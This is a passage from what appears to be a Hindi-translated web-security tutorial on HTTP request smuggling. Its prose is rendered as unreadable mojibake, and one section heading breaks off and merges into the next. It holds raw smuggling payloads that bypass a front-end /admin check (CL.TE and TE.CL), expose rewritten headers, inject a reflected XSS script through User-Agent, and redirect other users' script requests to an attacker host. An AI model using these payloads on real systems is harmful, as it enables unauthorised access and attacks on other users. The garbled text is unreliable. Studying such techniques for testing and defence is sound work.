* "рд╣рдорд▓рд╛" рдЕрдиреБрд░реЛрдз рдФрд░ "рд╕рд╛рдорд╛рдиреНрдп" рдЕрдиреБрд░реЛрдз рдХреЛ рд╕рд░реНрд╡рд░ рдХреЛ рдЕрд▓рдЧ рдиреЗрдЯрд╡рд░реНрдХ рдХрдиреЗрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреЗрдЬрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред рджреЛрдиреЛрдВ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдПрдХ рд╣реА рдХрдиреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬрдиреЗ рд╕реЗ рдпрд╣ рд╕рд┐рджреНрдз рдирд╣реАрдВ рд╣реЛрдЧрд╛ рдХрд┐ рджреБрд░реНрдЧрдорддрд╛ рдореМрдЬреВрдж рд╣реИред
* "рд╣рдорд▓рд╛" рдЕрдиреБрд░реЛрдз рдФрд░ "рд╕рд╛рдорд╛рдиреНрдп" рдЕрдиреБрд░реЛрдз рдХреЛ рдпрдерд╛рд╕рдВрднрд╡ рд╕рдорд╛рди URL рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░ рдирд╛рдореЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдПред рдЗрд╕рд▓рд┐рдП рдХрд┐ рдХрдИ рдЖрдзреБрдирд┐рдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди URL рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдлреНрд░рдВрдЯ-рдПрдВрдб рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╡рд┐рднрд┐рдиреНрди рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░реЛрдВ рдХреЛ рдорд╛рд░реНрдЧрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рддреЗ рд╣реИрдВред рд╕рдорд╛рди URL рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ рдпрд╣ рд╕рдВрднрд╛рд╡рдирд╛ рдмрдврд╝ рдЬрд╛рддреА рд╣реИ рдХрд┐ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдПрдХ рд╣реА рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╕рдВрд╕реНрдХреГрдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬреЛ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╣реИред
* "рд╕рд╛рдорд╛рдиреНрдп" рдЕрдиреБрд░реЛрдз рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП "рд╣рдорд▓рд╛" рдЕрдиреБрд░реЛрдз рд╕реЗ рдХрд┐рд╕реА рднреА рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХреА рдкреНрд░рднрд╛рд╡рд┐рдд рд╣реЛрдиреЗ рдХреЗ рд╕рд╛рде, рдЖрдк рдЙрд╕ рдЕрдиреБрд░реЛрдз рдХреЛ рддреБрд░рдВрдд "рд╣рдорд▓рд╛" рдЕрдиреБрд░реЛрдз рдХреЗ рдмрд╛рдж рднреЗрдЬрдирд╛ рдЪрд╛рд╣рд┐рдПред рдпрджрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╡реНрдпрд╕реНрдд рд╣реИ, рддреЛ рдЖрдкрдХреЛ рджреБрд░реНрдЧрдорддрд╛ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рдкреНрд░рдпрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред
* рдХреБрдЫ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдореЗрдВ, рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░ рд▓реЛрдб рдмреИрд▓реЗрдВрд╕рд░ рдХреА рддрд░рд╣ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИ, рдФрд░ URL рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╡рд┐рднрд┐рдиреНрди рдмреИрдХ-рдПрдВрдб рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЛ рдЕрдиреБрд░реЛрдз рднреЗрдЬрддрд╛ рд╣реИред рдпрджрд┐ рдЖрдкрдХрд╛ "рд╣рдорд▓рд╛" рдФрд░ "рд╕рд╛рдорд╛рдиреНрдп" рдЕрдиреБрд░реЛрдз рд╡рд┐рднрд┐рдиреНрди рдмреИрдХ-рдПрдВрдб рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХреЛ рдкреНрд░реЗрд╖рд┐рдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рддреЛ рд╣рдорд▓рд╛ рдЕрд╕рдлрд▓ рд╣реЛрдЧрд╛ред рдпрд╣ рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд рдХрд╛рд░рдг рд╣реИ рдХрд┐ рдЖрдкрдХреЛ рджреБрд░реНрдЧрдорддрд╛ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рдмрд╛рд░ рдкреНрд░рдпрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред
* рдпрджрд┐ рдЖрдкрдХрд╛ рд╣рдорд▓рд╛ рдХрд┐рд╕реА рднрд╡рд┐рд╖реНрдпрд╡рд╛рдгреА рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ "рд╕рд╛рдорд╛рдиреНрдп" рдЕрдиреБрд░реЛрдз рдирд╣реАрдВ рдерд╛ рдЬрд┐рд╕реЗ рдЖрдкрдиреЗ рд╣рд╕реНрддрдХреНрд╖реЗрдк рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рднреЗрдЬрд╛ рдерд╛, рддреЛ рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рджреВрд╕рд░реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЖрдкрдХреЗ рд╣рдорд▓реЗ рдХрд╛ рдкреНрд░рднрд╛рд╡ рдкрдбрд╝рд╛ред рдпрджрд┐ рдЖрдк рдкрд░реАрдХреНрд╖рдг рдЬрд╛рд░реА рд░рдЦрддреЗ рд╣реИрдВ, рддреЛ рдЗрд╕рд╕реЗ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдкрд░ рдЕрд╕реНрдерд┐рд░ рдкреНрд░рднрд╛рд╡ рдкрдбрд╝ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдЖрдкрдХреЛ рд╕рддрд░реНрдХрддрд╛ рдмрд░рддрдиреА рдЪрд╛рд╣рд┐рдПред

### рд╣реЙрдк-рдмрд╛рдп-рд╣реЙрдк рд╣реЗрдбрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдмрд▓рд╡рд╛рди рдмрдирд╛рдирд╛

рд╣реЙрдк-рдмрд╛рдп-рд╣реЙрдк рд╣реЗрдбрд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдкреНрд░реЙрдХреНрд╕реА рдХреЛ рд╕рдВрдХреЗрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ **Content-Length рдпрд╛ Transfer-Encoding рд╣реИрдбрд░ рдХреЛ рд╣рдЯрд╛ рджреЗрдВ рддрд╛рдХрд┐ HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ**ред
```
Connection: Content-Length
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП **рд╣реЙрдк-рдмрд╛рдп-рд╣реЙрдк рд╣реЗрдбрд░реНрд╕ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ** рджреЗрдЦреЗрдВ:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## HTTP рд░рд┐рдХреНрддрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛

### рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕реБрд░рдХреНрд╖рд╛ рдирд┐рдпрдВрддреНрд░рдг рдХреЛ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП

рдХрднреА-рдХрднреА **рдлреНрд░рдВрдЯ-рдПрдВрдб рдкреНрд░реЙрдХреНрд╕реА рд╕реБрд░рдХреНрд╖рд╛ рдЬрд╛рдВрдЪреЗрдВ рдХрд░реЗрдВрдЧреЗ**ред рдЖрдк HTTP рд░рд┐рдХреНрддрд┐ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрдиреНрд╣реЗрдВ рдЯрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдЖрдкрдХреЛ **рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЯрд╛рд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓реЗрдЧреА**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдЖрдк **рдмрд╛рд╣рд░ рд╕реЗ `/admin` рддрдХ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рдкрд╛ рд░рд╣реЗ рд╣реИрдВ** рдФрд░ рдлреНрд░рдВрдЯ-рдПрдВрдб рдкреНрд░реЙрдХреНрд╕реА рдЗрд╕реЗ рдЬрд╛рдВрдЪ рд░рд╣реА рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ **рдкреНрд░реЙрдХреНрд╕реА рдПрдореНрдмреЗрдбреЗрдб рдЕрдиреБрд░реЛрдз рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХрд░ рд░рд╣реА рд╣реИ**:

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### рдлреНрд░рдВрдЯ-рдПрдВрдб рдЕрдиреБрд░реЛрдз рдкреБрдирд░реНрд▓реЗрдЦрди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

рдмрд╣реБрдд рд╕рд╛рд░реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдореЗрдВ, **рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдкреБрдирд░реНрд▓реЗрдЦрд┐рдд рдХрд░рддрд╛ рд╣реИ** рдЬреЛ рдХрд┐ рдЙрдиреНрд╣реЗрдВ рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ рдХреЛ рдЖрдЧреЗ рднреЗрдЬрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ, рд╕рд╛рдорд╛рдиреНрдпрддрдГ рдХреБрдЫ рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдиреБрд░реЛрдз рд╣реЗрдбрд░ рдЬреЛрдбрд╝рдХрд░ рдХрд░рддрд╛ рд╣реИред\
рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдХрд╛рд░реНрдп рд╣реИ рдХрд┐ рдЕрдиреБрд░реЛрдз рдореЗрдВ **рд╣реЗрдбрд░ рдЬреЛрдбрд╝реЗрдВ** `X-Forwarded-For: <рдЧреНрд░рд╛рд╣рдХ рдХрд╛ IP>` рдпрд╛ рдХреБрдЫ рдРрд╕рд╛ рд╣реЗрдбрд░ рддрд╛рдХрд┐ рдмреИрдХ-рдПрдВрдб рдХреЛ рдЧреНрд░рд╛рд╣рдХ рдХрд╛ IP рдкрддрд╛ рдЪрд▓реЗред\
рдХрднреА-рдХрднреА, рдпрджрд┐ рдЖрдк **рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдХреМрди рд╕реЗ рдирдП рдорд╛рди рдЬреЛрдбрд╝реЗ рдЧрдП рд╣реИрдВ**, рддреЛ рдЖрдк рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЯрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдЫрд┐рдкреА рд╣реБрдИ рдЬрд╛рдирдХрд╛рд░реА**/**рдПрдВрдбрдкреЙрдЗрдВрдЯ** рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред

рдЕрдиреБрд░реЛрдз рдХреЛ рдкреБрдирд░реНрд▓реЗрдЦрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдПрдХ POST рдкреИрд░рд╛рдореАрдЯрд░ рдвреВрдВрдврд╝рдирд╛ рд╣реЛрдЧрд╛ рдЬрд┐рд╕рдХрд╛ рд╡реИрд▓реНрдпреВ рдмреИрдХ-рдПрдВрдб рдЙрддреНрддрд░ рдореЗрдВ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛрдЧрд╛ред рдлрд┐рд░, рдЗрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдВрддрд┐рдо рдХрд░реЗрдВ рдФрд░ рдЗрд╕ рддрд░рд╣ рдХреЗ рдПрдХ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЕрдЧрд▓рд╛ рдЕрдиреБрд░реЛрдз `search=` рдХреЗ рдмрд╛рдж рдЬреЛрдбрд╝рд╛ рдЬрд╛рдПрдЧрд╛ рдЬреЛ рдХрд┐ рднреА **рдкреИрд░рд╛рдореАрдЯрд░ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдорд╛рди рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛрдЧрд╛** рдЙрддреНрддрд░ рдореЗрдВ, рдЗрд╕рд▓рд┐рдП рдпрд╣ **рдЕрдЧрд▓реЗ рдЕрдиреБрд░реЛрдз рдХреЗ рд╣реЗрдбрд░ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдХрд░реЗрдЧрд╛**ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **рдХреЗрд╡рд▓ рдПрдореНрдмреЗрдбреЗрдб рдЕрдиреБрд░реЛрдз рдХреЗ `Content-Length` рд╣реЗрдбрд░ рдореЗрдВ рджрд┐рдЦрд╛рдП рдЧрдП рд▓рдВрдмрд╛рдИ рдХреЛ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред рдпрджрд┐ рдЖрдк рдХрдо рд╕рдВрдЦреНрдпрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдХреЗрд╡рд▓ рдХреБрдЫ рдмрд╛рдЗрдЯ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛрдВрдЧреЗ, рдпрджрд┐ рдЖрдк рд╕рднреА рд╣реЗрдбрд░реЛрдВ рдХреА рд▓рдВрдмрд╛рдИ рд╕реЗ рдмрдбрд╝реА рд╕рдВрдЦреНрдпрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдПрдореНрдмреЗрдбреЗрдб рдЕрдиреБрд░реЛрдз рдореЗрдВ рддреНрд░реБрдЯрд┐ рд╣реЛрдЧреАред рдлрд┐рд░, рдЖрдкрдХреЛ **рдПрдХ рдЫреЛрдЯреА рд╕рдВрдЦреНрдпрд╛** рд╕реЗ **рд╢реБрд░реВ** рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП рдФрд░ рдЗрд╕реЗ **рдмрдврд╝рд╛рддреЗ** рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрдм рддрдХ рдЖрдкрдХреЛ рджреЗрдЦрдирд╛ рдирд╣реАрдВ рд╣реЛрддрд╛ рдХрд┐ рдЖрдкрдХреЛ рдХреНрдпрд╛ рджреЗрдЦрдирд╛ рд╣реИред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ **рддрдХрдиреАрдХ рдПрдХ TE.CL** рд╕рдВрдХреНрд░рдордг рдХреЗ рд╕рд╛рде рднреА рд╢реЛрд╖рдгреАрдп рд╣реИ рд▓реЗрдХрд┐рди рдЕрдиреБрд░реЛрдз рдХреЛ `search=\r\n0` рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдирдИ рдкрдВрдХреНрддрд┐ рд╡рд░реНрдгреЛрдВ рдХреЗ рдмрд╛рд╡рдЬреВрдж рдорд╛рдиреЛрдВ рдХреЛ рдЦреЛрдЬ рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛рдПрдЧрд╛ред

рдЕрдВрдд рдореЗрдВ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рд╣рдорд▓реЗ рдореЗрдВ рд╣рдо рдЕрднреА рднреА рдЦреБрдж рдХреЛ рд╣рдорд▓рд╛ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╣рдо рдпрд╣ рдЬрд╛рди рд╕рдХреЗрдВ рдХрд┐ рдлреНрд░рдВрдЯ-рдПрдВрдб рдкреНрд░реЙрдХреНрд╕реА рдЕрдиреБрд░реЛрдз рдХреЛ рдХреИрд╕реЗ рдкреБрдирд░реНрд▓реЗрдЦрд┐рдд рдХрд░ рд░рд╣реА рд╣реИред

### рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдЕрдиреБрд░реЛрдз рдХреИрдкреНрдЪрд░ рдХрд░рдирд╛ <a href="#capturing-other-users-
### HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд XSS рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛

рдпрджрд┐ рд╡реЗрдм рдкреГрд╖реНрда рднреА **рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд XSS рдХреЗ рд▓рд┐рдП рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд** рд╣реИ, рддреЛ рдЖрдк HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡реЗрдм рдХреЗ рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЛ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рд╕реЗ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд XSS рдХрд╛ рд╢реЛрд╖рдг рдХреБрдЫ рд▓рд╛рдн рд╣реИрдВ:

* **рдпрд╣ рдкреАрдбрд╝рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╕рд╛рде рдХреЛрдИ рд╕рдВрд╡рд╛рдж рдирд╣реАрдВ рдЖрд╡рд╢реНрдпрдХ рд╣реИ**
* рдпрд╣ рдЙрди рдЕрдиреБрд░реЛрдз рдХреЗ рднрд╛рдЧреЛрдВ рдореЗрдВ XSS рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдПрдХ рд╕рд╛рдзрд╛рд░рд┐рдд рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд XSS рд╣рдорд▓реЗ рдореЗрдВ рд╕рд░рд▓рддрд╛рдкреВрд░реНрд╡рдХ рдирд┐рдпрдВрддреНрд░рд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ HTTP рдЕрдиреБрд░реЛрдз рд╣реЗрдбрд░ред

рдпрджрд┐ рд╡реЗрдм рдкреНрд░рдпреЛрдЧрдХрд░реНрддрд╛-рдПрдЬреЗрдВрдЯ рд╣реЗрдбрд░ рдкрд░ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд XSS рдХреЗ рд▓рд┐рдП рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рд╣реИ, рддреЛ рдЖрдк рдЗрд╕ рдкреЗрд▓реЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕реЗ рд╢реЛрд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

`POST / HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0`\
`Cookie: session=Ro7YknOtbl3bxURHAAxZz84qj3PSMnSY`\
`Transfer-Encoding: chunked`\
`Connection: keep-alive`\
`Content-Length: 213`\
`Content-Type: application/x-www-form-urlencoded`\
``\ `0`\``\
`GET /post?postId=2 HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: "><script>alert(1)</script>`\
`Content-Length: 10`\
`Content-Type: application/x-www-form-urlencoded`\
\`\`\
`A=`

### HTTP рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╕рд╛рдЗрдЯ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рдХреЛ рдЦреЛрд▓реЗ рдирд┐рд░реНрджреЗрд╢ рдореЗрдВ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

рдХрдИ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдПрдХ URL рд╕реЗ рджреВрд╕рд░реЗ URL рдкрд░ рд╕рд╛рдЗрдЯ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЕрдиреБрд░реЛрдз рдХреЗ `Host` рд╣реЗрдбрд░ рдореЗрдВ рд╕реЗ рд╣реЛрд╕реНрдЯрдирд╛рдо рдХреЛ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ URL рдореЗрдВ рд░рдЦрддреЗ рд╣реИрдВред рдЗрд╕рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдЕрдкрд╛рдЪреЗ рдФрд░ IIS рд╡реЗрдм рд╕рд░реНрд╡рд░реЛрдВ рдХреЗ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╡реНрдпрд╡рд╣рд╛рд░ рд╣реИ, рдЬрд╣рд╛рдВ рдПрдХ рдЯреНрд░реЗрд▓рд┐рдВрдЧ рд╕реНрд▓реИрд╢ рдХреЗ рдмрд┐рдирд╛ рдПрдХ рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрд░реЛрдз рдПрдХ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ:

`GET /home HTTP/1.1`\
`Host: normal-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://normal-website.com/home/`

рдпрд╣ рд╡реНрдпрд╡рд╣рд╛рд░ рд╕рд╛рдорд╛рдиреНрдпрддрдГ рдЕрд╣рд╛рдирд┐рдХрд╛рд░рдХ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рдПрдХ рдЕрдиреБрд░реЛрдз рд╕реНрдордЧрд▓рд┐рдВрдЧ рд╣рдорд▓реЗ рдореЗрдВ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдПрдХ рдмрд╛рд╣рд░реА рдбреЛрдореЗрди рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 54`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: X`

рд╕реНрдордЧрд▓рд┐рдВрдЧ рдЕрдиреБрд░реЛрдз рдПрдХ рдЕрдкрд░рд╛рдзреА рдХреА рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд░реЗрдЧрд╛, рдЬреЛ рдкреАрдЫреЗ рдХреА рдУрд░ рд╕рдВрдЪрд╛рд▓рд┐рдд рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рд╕рдВрд╕реНрдХреГрдд рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЕрдЧрд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЕрдиреБрд░реЛрдз рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓реЗрдЧрд╛ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:

`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: XGET /scripts/include.js HTTP/1.1`\
`Host: vulnerable-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://attacker-website.com/home/`

